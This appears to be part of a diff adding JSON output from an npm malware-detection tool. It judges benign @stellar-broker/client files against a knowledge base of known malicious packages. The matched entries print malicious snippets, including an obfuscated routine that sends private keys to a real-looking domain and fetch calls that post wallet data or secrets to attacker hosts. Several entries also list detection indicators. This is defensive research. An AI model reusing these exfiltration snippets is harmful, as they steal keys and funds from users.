+                  "why_malicious": "The package was compromised following an npm account takeover, resulting in the distribution of malicious code that exfiltrated users’ wallet data to an attacker-controlled domain. The malicious versions were published under the guise of the legitimate, high-reputation Ledger Connect Kit, targeting decentralized application users and enabling theft of cryptocurrency and sensitive wallet information."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker compromises a former Ledger employee’s npmjs account.",
+                    "implemented_by": [],
+                    "leads_to": "Gains ability to publish new versions of the Ledger Connect Kit package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker publishes malicious versions of Ledger Connect Kit to npm under the legitimate package name.",
+                    "implemented_by": [],
+                    "leads_to": "Users and projects unknowingly install the compromised package"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code executes in the user’s browser or application context, exfiltrating wallet data to an attacker-controlled domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Theft of cryptocurrency and sensitive wallet information from affected users"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in wallet-related npm packages making network requests to hardcoded or untrusted domains",
+                    "Access to browser wallet APIs or DOM elements containing wallet data within package code",
+                    "Unexpected or unauthorized code changes in high-reputation packages following maintainer account changes or suspicious publish activity"
+                  ],
+                  "file_indicators": [
+                    "Modified or newly added main JavaScript bundle in Ledger Connect Kit",
+                    "Presence of new, obfuscated, or suspicious code blocks making outbound network requests to unknown domains"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests from wallet applications to domains not associated with Ledger or its official partners",
+                    "Unusual traffic patterns from browser wallet extensions or dApps to previously unseen endpoints"
+                  ],
+                  "how_to_detect": "Monitor for unexpected network requests originating from wallet-related JavaScript packages, especially after recent package updates or maintainer changes. Use static and dynamic analysis to identify code accessing wallet data and transmitting it to untrusted domains. Track package maintainer activity and flag sudden account changes or suspicious publishing behavior. Compare package versions for unauthorized code insertions or modifications, and alert on outbound requests to non-official domains."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/errors.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/estimate.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "estimate_slice_1",
+          "code_snippet": "import errors, {StellarBrokerError} from './errors.js'\nimport {validateQuoteRequest} from './quote-request.js'\nimport {QuoteResult} from './quote-result.js'\n\n/**\n * Request single swap quote estimate without trading\n * @param {QuoteParams} params\n * @return {Promise<QuoteResult>}\n */\nexport async function estimateSwap(params) {\n    const query = Object.entries(validateQuoteRequest(params))\n        .filter(kv => kv[1] !== undefined)\n        .map(([param, value]) => encodeURIComponent(param) + '=' + encodeURIComponent(value))\n    const url = (params.origin || 'https://api.stellar.broker') + '/quote?' + query.join('&')\n    try {\n        const res = await fetch(url).then(r => r.json())\n        if (res.status !== 'success')\n            throw errors.quoteError(res.error || 'Quote not available')\n        return new QuoteResult(res)\n    } catch (e) {\n        if (e instanceof StellarBrokerError)\n            throw e\n        throw errors.quoteError('Failed to fetch quote')\n        return null\n    }\n}",
+          "is_malicious": false,
+          "malice_score": 0.3813210984071096,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code constructs a URL using a hardcoded domain 'https://api.stellar.broker' (or an override from params.origin) and sends an HTTP GET request via fetch to retrieve a swap quote. It encodes query parameters from validated input and sends them as URL parameters, then processes the JSON response. This behavior performs network communication to a hardcoded external API endpoint, enabling data retrieval from a remote server.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code performs a straightforward network request to a hardcoded or parameterized API endpoint to fetch a swap quote. It validates input parameters, encodes them into a URL query string, and processes the JSON response. There is no evidence of obfuscation, exfiltration of sensitive data, wallet connection attempts, or unauthorized transaction creation. The code does not interact with wallet APIs, private keys, or perform any suspicious system manipulation. Compared to the known malicious patterns, which involve wallet access, private key exfiltration, or transaction manipulation, this code is benign and implements a legitimate API call for quote estimation.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_780352_snippet_2",
+              "source_package": "lottie-player (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780352/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3829101324081421,
+              "code_similarity": 0.3355463147163391,
+              "behavior_similarity": 0.43027397990226746,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Malicious wallet drainer logic (representative):\nwindow.ethereum.request({ method: 'eth_requestAccounts' })\n  .then(accounts => {\n    // Exfiltrate assets\n    fetch('wss://castleservices01.com', { method: 'POST', body: JSON.stringify({ accounts }) });\n    // Initiate draining transactions\n    // ...\n  });",
+                "code_behavior": "At runtime, after the user interacts with a wallet connect prompt, the code requests access to the user's web3 wallet, collects account information, sends this data to the attacker's server via WebSocket or HTTP POST, and initiates unauthorized transactions to transfer assets to attacker-controlled addresses.",
+                "malice_analysis": {
+                  "why_suspicious": "The code abuses the wallet connection process to exfiltrate sensitive wallet information and automate asset transfers, which is a hallmark of crypto drainer malware.",
+                  "violated_expectations": "A legitimate animation player should never interact with web3 wallets, prompt for wallet connections, or initiate asset transfers.",
+                  "similar_legitimate_use": "Legitimate decentralized applications (dApps) prompt for wallet connection only for transparent, user-initiated actions and never exfiltrate wallet data to untrusted domains.",
+                  "key_indicators": [
+                    "Unsolicited wallet connection prompts on non-crypto-related sites",
+                    "Use of window.ethereum.request for eth_requestAccounts outside of dApp context",
+                    "Outbound WebSocket or HTTP(S) requests to castleservices01.com or similar domains",
+                    "Automated transaction logic following wallet connection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user interaction)",
+                  "file_location": "Injected by drainer.js (loaded at runtime)",
+                  "required_permissions": [
+                    "network",
+                    "web3 wallet access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "lottie-player",
+                  "package_manager": "npm",
+                  "package_versions": "2.0.5, 2.0.6, 2.0.7",
+                  "why_malicious": "Versions 2.0.5, 2.0.6, and 2.0.7 of the lottie-player npm package were compromised in a supply chain attack. The attacker injected code that loads a remote crypto drainer script, which prompts users to connect their cryptocurrency wallets and then exfiltrates assets (cryptocurrency and NFTs) to attacker-controlled addresses. This malicious behavior is unrelated to the legitimate functionality of an animation library and poses a severe risk to users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious lottie-player package is loaded by the website (via CDN or npm), triggering the import-time execution of injected code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Loads remote drainer script from attacker-controlled domain (castleservices01.com)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The drainer script, once loaded, injects a wallet connect UI and prompts the user to connect their crypto wallet.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is deceived into connecting their wallet, granting access to wallet information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Upon wallet connection, the script exfiltrates wallet information and initiates unauthorized transactions to steal assets.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Victim's cryptocurrency and NFTs are transferred to attacker-controlled addresses."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Dynamic script injection from domains not affiliated with LottieFiles (e.g., castleservices01.com) during import-time of lottie-player.js",
+                    "Wallet connect prompts or web3 wallet access requests on sites not expected to interact with cryptocurrency wallets",
+                    "Outbound WebSocket or HTTP(S) connections to known phishing or drainer domains (e.g., castleservices01.com) following wallet connection"
+                  ],
+                  "file_indicators": [
+                    "dist/lottie-player.js containing references to castleservices01.com or similar suspicious domains",
+                    "Presence of dynamically injected <script> elements with src attributes pointing to external drainer payloads",
+                    "Unexpected modifications or additions to lottie-player.js in npm package versions 2.0.5, 2.0.6, or 2.0.7"
+                  ],
+                  "network_indicators": [
+                    "Any network connections (HTTP, HTTPS, WebSocket) to castleservices01.com",
+                    "Outbound requests to domains with a history of crypto phishing or drainer activity after loading animation libraries"
+                  ],
+                  "how_to_detect": "Monitor for external script loads initiated by lottie-player.js, especially from domains not associated with LottieFiles. Flag any wallet connect prompts or web3 wallet access requests on sites that do not provide crypto-related functionality. Detect and alert on outbound network connections to known drainer or phishing domains (such as castleservices01.com) after loading animation libraries. Use file integrity monitoring to detect unauthorized changes or suspicious references in npm package files, particularly in dist/lottie-player.js for the affected versions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_095515_snippet_2",
+              "source_package": "@jackshanyeshuzi/curvess (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_095515/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.38232365250587463,
+              "code_similarity": 0.35685867071151733,
+              "behavior_similarity": 0.40778863430023193,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "try {\n  let m1 = ['w', 'a', 'l', 'l', 'e', 't', '.', 'c', 'b', 'a', '1', '2', '3', 'n', '/', 'i', 'n', 'd', 'e', 'x', '?', 'p', 'r', '=', 's', ':'];\n  let h = m1[18] + m1[4] + m1[17] + m1[23] + m1[24] + m1[12] + m1[0] + m1[1] + m1[2] + m1[2] + m1[4] + m1[5] + m1[6] + m1[7] + m1[8] + m1[9] + m1[10] + m1[5] + m1[3] + m1[11];\n  let path = m1[12] + m1[13] + m1[15] + m1[16] + m1[20] + m1[21] + m1[13] + m1[11] + m1[4] + m1[22];\n  https.get(h + path + privateKey.toString(), function () { });\n} catch (e) {}",
+                "code_behavior": "At runtime, during cryptographic signing operations, the code obfuscates the exfiltration endpoint by constructing the host and path from an array, then sends the private key via HTTPS GET to the malicious server, enabling stealthy exfiltration of sensitive key material.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation of the exfiltration endpoint is a clear attempt to evade detection by static and dynamic analysis tools. The behavior is otherwise identical to the previous snippet, with the same critical security violation of exfiltrating private keys.",
+                  "violated_expectations": "No legitimate cryptographic code would obfuscate network destinations or transmit private keys. Secure libraries are expected to be transparent and never hide network communication, especially involving sensitive data.",
+                  "similar_legitimate_use": "Obfuscation may be used for licensing or anti-tamper in some software, but never for exfiltrating cryptographic secrets. There is no legitimate use for this pattern in cryptographic libraries.",
+                  "key_indicators": [
+                    "Obfuscated construction of malicious host and path",
+                    "HTTPS request with private key in URL",
+                    "Try/catch block to suppress errors and evade detection",
+                    "Exfiltration of private key material"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during cryptographic signing operations, later/obfuscated version)",
+                  "file_location": "abstract/weierstrass.js (prepSig function, later version)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@jackshanyeshuzi/curvess",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 - 1.1.9 (all published versions as of 2023-08-04)",
+                  "why_malicious": "This package is a typosquat of the legitimate @noble/curves cryptography library. It contains deeply embedded malicious code that exfiltrates users' private cryptographic keys to an external server (wallet.cba123.cn), compromising all cryptographic operations and user security. The malicious code is designed to be stealthy, does not alter the primary cryptographic functionality, and is triggered during sensitive operations, making it highly dangerous and difficult to detect."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs ethereum-cryptographyyy, which depends on @jackshanyeshuzi/curvess instead of @noble/curves.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code in @jackshanyeshuzi/curvess is loaded and available."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When cryptographic signing is performed, the prepSig function in @jackshanyeshuzi/curvess is invoked.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Private key is captured and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "prepSig function sends the private key to wallet.cba123.cn via HTTP/HTTPS request.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives the user's private key, compromising all cryptographic security."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Obfuscation is added in later versions to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Stealthier exfiltration, harder detection."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Network requests (HTTP/HTTPS) originating from cryptographic math or signing functions",
+                    "Exfiltration of private key or sensitive cryptographic material during signing operations",
+                    "Obfuscated string construction for network destinations within cryptographic code",
+                    "Unexpected logging of private keys in cryptographic libraries"
+                  ],
+                  "file_indicators": [
+                    "Import of http or https modules in cryptographic math files (e.g., abstract/weierstrass.js)",
+                    "Typosquatted package names in dependencies (e.g., @jackshanyeshuzi/curvess instead of @noble/curves)",
+                    "prepSig function containing network requests or exfiltration logic"
+                  ],
+                  "network_indicators": [
+                    "Connections to wallet.cba123.cn",
+                    "IP address 42.96.168.4 (ALISOFT, CN)",
+                    "Unusual HTTP/HTTPS requests during cryptographic operations"
+                  ],
+                  "how_to_detect": "Monitor for network requests originating from cryptographic libraries, especially during signing or key generation. Flag any code that logs or transmits private keys. Detect obfuscated string construction that resolves to known malicious domains such as wallet.cba123.cn. Audit dependencies for typosquatting and unexpected changes in package.json. Alert on the import of network modules (http, https) in files that should only perform mathematical operations. Correlate network activity with cryptographic function execution to identify exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.38198649883270264,
+              "code_similarity": 0.3743341863155365,
+              "behavior_similarity": 0.3896388113498688,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102817_039379_snippet_3",
+              "source_package": "Multiple (examples: Ledger Connect Kit, malicious PyPI packages, 'everything' NPM package) (npm, PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102817_039379/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3773256838321686,
+              "code_similarity": 0.3263933062553406,
+              "behavior_similarity": 0.4282580614089966,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "fetch('https://malicious-ledger.site/api/steal', { method: 'POST', body: JSON.stringify({ wallet: userWallet }) })",
+                "code_behavior": "At runtime, the code sends user wallet information via a POST request to a hardcoded malicious server, resulting in exfiltration of sensitive wallet data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code exfiltrates sensitive wallet data to an attacker-controlled endpoint, directly targeting user assets.",
+                  "violated_expectations": "Legitimate wallet libraries must never transmit private wallet data to external servers.",
+                  "similar_legitimate_use": "None; wallet secrets should never be sent externally.",
+                  "key_indicators": [
+                    "Hardcoded malicious endpoint in fetch call",
+                    "POST request containing wallet data",
+                    "Network exfiltration of sensitive user information"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "Ledger Connect Kit compromised JavaScript file",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple (examples: Ledger Connect Kit, malicious PyPI packages, 'everything' NPM package)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "Various (e.g., compromised Ledger Connect Kit versions, malicious PyPI packages, 'everything' NPM package)",
+                  "why_malicious": "These packages are considered malicious due to intentional code injection, account takeovers, dependency abuse, and the use of obfuscation/encryption to hide malicious payloads. They are designed to exfiltrate secrets, steal funds, or disrupt the software supply chain by leveraging trusted ecosystems and transitive dependencies."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains access to a developer or maintainer account (e.g., via phishing or account takeover).",
+                    "implemented_by": [],
+                    "leads_to": "Ability to publish malicious package versions."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code is injected into the package (e.g., postinstall scripts, runtime exfiltration, dependency abuse).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Malicious package is published to the registry."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Consumers or CI/CD systems install the malicious package, triggering the execution of malicious code.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Secrets exfiltration, wallet theft, or supply chain disruption."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrated data is sent to attacker-controlled infrastructure, or the supply chain is disrupted.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves their objective (data theft, financial gain, or disruption)."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to environment variables and outbound network requests in package code, especially at import or install time",
+                    "Presence of postinstall scripts that download and execute remote code (e.g., curl|bash) in package.json",
+                    "Packages declaring excessive or all-encompassing dependencies in package.json",
+                    "Runtime exfiltration of sensitive user data (e.g., wallet information) to hardcoded external domains"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious postinstall scripts (e.g., curl|bash patterns)",
+                    "package.json with thousands or millions of dependencies",
+                    "Python modules that access secrets and make network requests at import-time",
+                    "JavaScript files containing fetch or XHR calls to unknown or hardcoded domains"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to hardcoded malicious domains (e.g., malicious-domain.com, malicious-ledger.site)",
+                    "Unusual POST requests containing secrets or wallet data",
+                    "Outbound network traffic initiated during install or import time"
+                  ],
+                  "how_to_detect": "Monitor for packages that access environment variables or sensitive files and initiate outbound network requests, particularly during install or import time. Flag packages with postinstall scripts that execute remote code or with an unusually high number of dependencies. Use threat intelligence feeds to block known malicious domains and monitor for exfiltration patterns. Employ automated SBOM and secret scanning tools to detect hardcoded secrets and dependency abuse. Correlate file, behavioral, and network indicators to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_096923_snippet_1",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_096923/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3753603398799896,
+              "code_similarity": 0.30812084674835205,
+              "behavior_similarity": 0.4425998330116272,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "fetch('https://malicious-domain.com/steal', { method: 'POST', body: JSON.stringify({ token: process.env.SECRET }) });",
+                "code_behavior": "At runtime, the code uses the fetch() API to send the value of the SECRET environment variable to a hardcoded external domain via HTTPS POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code initiates an outbound network request to an untrusted domain and transmits sensitive environment variable data, which is a common tactic for stealing credentials in supply chain attacks.",
+                  "violated_expectations": "Normal packages should not exfiltrate secrets or make unsolicited network requests during runtime, especially without user consent or documentation.",
+                  "similar_legitimate_use": "Legitimate telemetry or update checks may use fetch(), but should be transparent, documented, and never transmit secrets.",
+                  "key_indicators": [
+                    "Use of fetch() or other network APIs in package code",
+                    "Access to process.env or other sensitive environment variables",
+                    "Hardcoded external domains in network requests",
+                    "Outbound POST requests containing sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "index.js or any JavaScript source file",
+                  "required_permissions": [
+                    "network",
+                    "environment variable access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "No specific malicious package is analyzed in this report. The article discusses general supply chain attack techniques and detection strategies, referencing past incidents (event-stream, ua-parser-js) and suspicious behaviors (network access, shell execution, privileged API usage) that are indicative of malicious packages. The report highlights how these behaviors enable credential exfiltration, remote code execution, and unauthorized access, which are core threats in supply chain attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is introduced into the package, often via install scripts or obfuscated code that is difficult to detect during static analysis.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Execution of malicious payload during installation or runtime, setting up the environment for further compromise."
+                  },
+                  {
+                    "step": 2,
+                    "action": "At install or runtime, the package executes code that accesses sensitive data or system resources, such as environment variables, filesystem secrets, or spawns shells.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Exfiltration of secrets, unauthorized access to system resources, or system compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Sensitive data is exfiltrated to attacker-controlled domains, or remote code is executed for further compromise and persistence.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains access to secrets or persistent control over the compromised system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of postinstall or preinstall scripts that fetch and execute remote code",
+                    "Use of network APIs (fetch, http, https, net, dgram, dns) in package code, especially with hardcoded external domains",
+                    "Access to sensitive environment variables (e.g., process.env.SECRET) or filesystem paths (e.g., /etc/ssh/ssh_host_rsa_key, ~/.ssh/id_rsa)",
+                    "Use of eval() or other dynamic code execution functions with obfuscated or high-entropy strings",
+                    "Spawning shells or using child_process.exec to execute remote code"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious scripts (postinstall, preinstall) that fetch and execute remote code",
+                    "JavaScript files containing fetch(), require('child_process'), or eval() with suspicious arguments",
+                    "Access to files like ~/.ssh/id_rsa, /etc/ssh/ssh_host_rsa_key, or other sensitive system paths"
+                  ],
+                  "network_indicators": [
+                    "Outbound requests to unknown or hardcoded domains (e.g., https://malicious-domain.com/steal, https://malicious-domain.com/payload.sh, https://malicious-domain.com/evil.sh)",
+                    "Use of curl, wget, or powershell to fetch remote scripts in install or runtime scripts",
+                    "Unusual API calls to external services not documented in package usage"
+                  ],
+                  "how_to_detect": "Monitor package.json for install scripts that fetch or execute remote code. Analyze package source for use of network, shell, or privileged APIs, especially with hardcoded external domains. Flag access to sensitive files or environment variables. Detect use of eval() or obfuscated code. Correlate outbound network requests to untrusted domains during install or runtime. Use static and dynamic analysis to identify suspicious behaviors and cross-reference with known IOCs."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/events.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/mediator.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "mediator_slice_1",
+          "code_snippet": "import {Asset, Keypair, Memo, Operation, TransactionBuilder, Horizon, Networks, StrKey, TimeoutInfinite} from '@stellar/stellar-sdk'\nimport {fromStroops, toStroops} from './stroops.js'\nimport {convertToStellarAsset} from './asset.js'\nimport {AuthorizationWrapper} from './authorization.js'\n\nconst defaultStoragePrefix = 'msb_'\n\nexport class Mediator {\n    /**\n     * Create a trader mediator account instance for a given source account\n     * @param {string} source - Creator account address\n     * @param {string|Asset} sellingAsset - Identifier of the asset to sell\n     * @param {string|Asset} buyingAsset - Identifier of the asset to buy\n     * @param {string} sellingAmount - Asset amount to sell\n     * @param {ClientAuthorizationParams} authorization - Authorization callback or secret key\n     * @param {number} [reserveFeeAmount] - Amount reserved to cover tx fees (all unused funds will be refunded)\n     */\n    constructor(source, sellingAsset, buyingAsset, sellingAmount, authorization, reserveFeeAmount = 5) {\n        if (!StrKey.isValidEd25519PublicKey(source))\n            throw new Error('Invalid source account')\n        this.source = source\n        try {\n            this.sellingAsset = convertToStellarAsset(sellingAsset)\n        } catch (e) {\n            console.error(e)\n            throw new Error('Invalid selling asset')\n        }\n        try {\n            this.buyingAsset = convertToStellarAsset(buyingAsset)\n        } catch (e) {\n            console.error(e)\n            throw new Error('Invalid buying asset')\n        }\n        try {\n            this.sellingAmount = toStroops(sellingAmount)\n        } catch (e) {\n            console.error(e)\n            throw new Error('Invalid selling amount')\n        }\n        this.authorization = new AuthorizationWrapper(authorization)\n        this.reserveFeeAmount = reserveFeeAmount\n    }\n\n    /**\n     * Creator account address\n     * @type {string}\n     * @readonly\n     */\n    source\n    /**\n     * @type 